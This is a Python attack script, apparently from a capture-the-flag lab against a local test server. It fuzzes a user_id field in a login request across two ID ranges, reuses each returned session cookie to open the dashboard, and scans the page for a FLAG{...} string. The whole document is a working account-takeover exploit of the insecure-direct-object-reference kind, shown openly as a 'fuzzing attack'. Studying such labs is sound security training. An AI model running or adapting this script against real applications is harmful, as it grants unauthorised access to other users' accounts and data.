import requests
import re

# Target URL
BASE_URL = "http://127.0.0.1:32883"
LOGIN_URL = f"{BASE_URL}/password/test"
DASHBOARD_URL = f"{BASE_URL}/dashboard"

# Test ranges
test_ranges = [
    (1, 100),
    (9999, 10100)
]

# Track findings
successful_ids = []
flag_found = False

print("[*] Starting ID fuzzing attack")
print(f"[*] Testing ranges: {test_ranges}")
print()

total_tested = 0

for start, end in test_ranges:
    print(f"[*] Testing range {start}-{end}")
    
    for user_id in range(start, end + 1):
        total_tested += 1
        
        # Progress update every 25 IDs
        if total_tested % 25 == 0:
            print(f"[*] Progress: {total_tested} IDs tested...")
        
        try:
            # Step 1: POST to login with fuzzed user_id
            login_data = {
                'username': 'test',
                'password': 'test',
                'user_id': str(user_id)
            }
            
            login_response = requests.post(
                LOGIN_URL,
                data=login_data,
                allow_redirects=False,
                timeout=5
            )
            
            # Extract session cookie from login response
            session_cookie = login_response.cookies.get('session')
            
            if not session_cookie:
                # No session cookie = likely failed auth
                continue
            
            # Check login response status
            if login_response.status_code == 302:
                # Redirect usually means auth failed
                continue
            elif login_response.status_code == 500:
                # Server error - user might exist but error occurred
                print(f"[!] user_id={user_id}: Login returned 500 error")
                continue
            
            # Step 2: GET dashboard with the obtained session cookie
            cookies = {'session': session_cookie}
            dashboard_response = requests.get(
                DASHBOARD_URL,
                cookies=cookies,
                allow_redirects=False,
                timeout=5
            )
            
            # Analyze dashboard response
            status = dashboard_response.status_code
            content = dashboard_response.text
            content_length = len(content)
            
            # Check for FLAG pattern
            flag_match = re.search(r'FLAG\{[^}]+\}', content)
            
            if flag_match:
                flag_value = flag_match.group(0)
                print(f"\n{'='*80}")
                print(f"[!!!] FLAG FOUND at user_id={user_id}")
                print(f"[!!!] FLAG: {flag_value}")
                print(f"{'='*80}")
                print(f"[+] Login Status: {login_response.status_code}")
                print(f"[+] Dashboard Status: {status}")
                print(f"[+] Session Cookie: {session_cookie}")
                print(f"\n[+] Full Dashboard Response:")
                print(content)
                print(f"{'='*80}\n")
                flag_found = True
                successful_ids.append(user_id)
                break
            
            # Check for successful access (not 302, not 500)
            if status == 200:
                print(f"\n[+] SUCCESS: user_id={user_id}")
                print(f"    Login Status: {login_response.status_code}")
                print(f"    Dashboard Status: {status} | Length: {content_length}B")
                print(f"    Session Cookie: {session_cookie}")
                print(f"    Dashboard Response (first 500 chars):")
                print(f"    {content[:500]}")
                successful_ids.append(user_id)
            elif status == 302:
                # Redirect = likely auth failed or access denied
                pass
            elif status == 500:
                print(f"[!] user_id={user_id}: Dashboard returned 500 error")
            else:
                # Any other status code - might be interesting
                print(f"[?] user_id={user_id}: Unexpected status {status}")
                print(f"    Response: {content[:200]}")
        
        except requests.exceptions.Timeout:
            print(f"[!] user_id={user_id}: Request timeout")
        except requests.exceptions.ConnectionError:
            print(f"[!] user_id={user_id}: Connection error")
        except Exception as e:
            print(f"[!] user_id={user_id}: Error - {str(e)}")
    
    if flag_found:
        print("[*] Flag found, stopping search")
        break
    
    print(f"[*] Completed range {start}-{end}")
    print()

# Summary
print("\n" + "="*80)
print("[*] FUZZING COMPLETE")
print(f"[*] Total IDs tested: {total_tested}")
print(f"[*] Successful IDs: {len(successful_ids)}")
if successful_ids:
    print(f"[*] Working user_ids: {successful_ids}")
else:
    print("[*] No successful user_ids found")
print("="*80)

